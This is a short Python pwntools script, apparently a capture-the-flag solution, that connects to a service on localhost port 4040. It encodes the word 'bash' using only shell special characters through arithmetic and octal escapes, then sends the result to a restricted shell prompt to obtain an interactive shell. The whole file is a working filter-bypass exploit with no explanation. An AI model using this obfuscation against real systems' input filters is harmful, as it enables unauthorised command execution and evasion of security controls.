from pwn import *

HOST = 'localhost'
PORT = 4040

def numToBin(n):
    b = bin(n)[2:].replace('0', '$#').replace('1', '${##}')
    return f"$(($((${{##}}<<${{##}}))#{b}))"

def numToOct(n):
    return f"$'\\\\{numToBin(int(oct(n)[2:]))}'"

def stringToSpecialChars(st):
    return "".join([numToOct(ord(x)) for x in st])

payload = stringToSpecialChars('bash')

r = remote(HOST, PORT)

print(r.recvuntil(b'$ ').decode(), end='')
print(payload)

r.sendline(payload.encode())
r.interactive()


